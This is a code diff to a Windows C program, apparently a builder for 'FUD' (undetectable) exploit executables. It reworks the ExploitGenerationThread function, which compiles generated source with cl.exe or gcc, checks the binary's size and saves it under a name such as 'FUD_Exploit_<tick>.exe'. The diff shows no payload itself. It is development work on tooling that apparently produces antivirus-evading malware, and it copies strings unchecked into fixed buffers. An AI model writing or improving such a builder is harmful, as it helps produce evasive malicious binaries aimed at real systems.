@@ -239,22 +239,95 @@ DWORD WINAPI ExploitGenerationThread(LPVOID lpParam) {
         char tempExe[64];
         snprintf(tempExe, sizeof(tempExe), "temp_%d.exe", GetTickCount());
         
-        // Try different compiler commands
-        snprintf(compileCmd, sizeof(compileCmd), "cl.exe /nologo /O2 \"%s\" /Fe:\"%s\" /link /SUBSYSTEM:WINDOWS user32.lib 2>nul", tempSource, tempExe);
+        // Ensure output path has .exe extension
+        char finalOutputPath[260];
+        strcpy(finalOutputPath, outputPath);
+        char* lastDot = strrchr(finalOutputPath, '.');
+        if (!lastDot || _stricmp(lastDot, ".exe") != 0) {
+            if (lastDot) {
+                strcpy(lastDot, ".exe");
+            } else {
+                strcat(finalOutputPath, ".exe");
+            }
+        }
+        
+        // Try Visual Studio compiler first (with verbose output for debugging)
+        snprintf(compileCmd, sizeof(compileCmd), 
+            "cl.exe /nologo /O2 /MT \"%s\" /Fe:\"%s\" /link /SUBSYSTEM:WINDOWS user32.lib kernel32.lib", 
+            tempSource, tempExe);
         int result = system(compileCmd);
         
         if (result != 0) {
-            // Try gcc if cl.exe fails
-            snprintf(compileCmd, sizeof(compileCmd), "gcc -O2 -mwindows \"%s\" -o \"%s\" -luser32 2>nul", tempSource, tempExe);
+            // Try MinGW gcc compiler
+            snprintf(compileCmd, sizeof(compileCmd), 
+                "gcc -O2 -static -mwindows \"%s\" -o \"%s\" -luser32 -lkernel32", 
+                tempSource, tempExe);
             result = system(compileCmd);
         }
         
         if (result != 0) {
-            // If no compiler available, just save the source code
-            // Change extension to .cpp for source
+            // Try simple gcc without static linking
+            snprintf(compileCmd, sizeof(compileCmd), 
+                "gcc -O2 -mwindows \"%s\" -o \"%s\" -luser32", 
+                tempSource, tempExe);
+            result = system(compileCmd);
+        }
+        
+        // Check if executable was actually created and has content
+        FILE* exeCheck = fopen(tempExe, "rb");
+        if (exeCheck) {
+            fseek(exeCheck, 0, SEEK_END);
+            long fileSize = ftell(exeCheck);
+            fclose(exeCheck);
+            
+            if (fileSize > 4096) { // Ensure executable is reasonable size (>4KB)
+                // Compilation successful and executable is valid size
+                if (CopyFileA(tempExe, finalOutputPath, FALSE)) {
+                    DeleteFileA(tempSource);
+                    DeleteFileA(tempExe);
+                    PostMessage(hMainWindow, WM_USER + 1, 1, 0); // Full success
+                } else {
+                    // If copy failed, at least save the executable with a backup name
+                    char backupPath[260];
+                    snprintf(backupPath, sizeof(backupPath), "FUD_Exploit_%d.exe", GetTickCount());
+                    
+                    if (CopyFileA(tempExe, backupPath, FALSE)) {
+                        DeleteFileA(tempSource);
+                        DeleteFileA(tempExe);
+                        PostMessage(hMainWindow, WM_USER + 5, 0, 0); // Backup success
+                    } else {
+                        DeleteFileA(tempSource);
+                        DeleteFileA(tempExe);
+                        PostMessage(hMainWindow, WM_USER + 1, 0, 0); // Error
+                    }
+                }
+            } else {
+                // Executable too small, probably compilation failed
+                DeleteFileA(tempExe);
+                
+                // Save source code instead
+                char sourcePath[260];
+                strcpy(sourcePath, finalOutputPath);
+                lastDot = strrchr(sourcePath, '.');
+                if (lastDot) {
+                    strcpy(lastDot, ".cpp");
+                } else {
+                    strcat(sourcePath, ".cpp");
+                }
+                
+                if (CopyFileA(tempSource, sourcePath, FALSE)) {
+                    DeleteFileA(tempSource);
+                    PostMessage(hMainWindow, WM_USER + 4, 0, 0); // Source only success
+                } else {
+                    DeleteFileA(tempSource);
+                    PostMessage(hMainWindow, WM_USER + 1, 0, 0); // Error
+                }
+            }
+        } else {
+            // Executable not created, save source code instead
             char sourcePath[260];
-            strcpy(sourcePath, outputPath);
-            char* lastDot = strrchr(sourcePath, '.');
+            strcpy(sourcePath, finalOutputPath);
+            lastDot = strrchr(sourcePath, '.');
             if (lastDot) {
                 strcpy(lastDot, ".cpp");
             } else {
@@ -267,28 +340,6 @@ DWORD WINAPI ExploitGenerationThread(LPVOID lpParam) {
             } else {
                 DeleteFileA(tempSource);
                 PostMessage(hMainWindow, WM_USER + 1, 0, 0); // Error
-            }
-        } else {
-            // Compilation successful, copy executable to output path
-            if (CopyFileA(tempExe, outputPath, FALSE)) {
-                DeleteFileA(tempSource);
-                DeleteFileA(tempExe);
-                PostMessage(hMainWindow, WM_USER + 1, 1, 0); // Full success
-            } else {
-                // If copy failed, at least save the executable with a temp name
-                char backupPath[260];
-                strcpy(backupPath, "FUD_Exploit_");
-                strcat(backupPath, tempExe);
-                
-                if (CopyFileA(tempExe, backupPath, FALSE)) {
-                    DeleteFileA(tempSource);
-                    DeleteFileA(tempExe);
-                    PostMessage(hMainWindow, WM_USER + 5, 0, 0); // Backup success
-                } else {
-                    DeleteFileA(tempSource);
-                    DeleteFileA(tempExe);
-                    PostMessage(hMainWindow, WM_USER + 1, 0, 0); // Error
-                }
             }
         }
     } else {
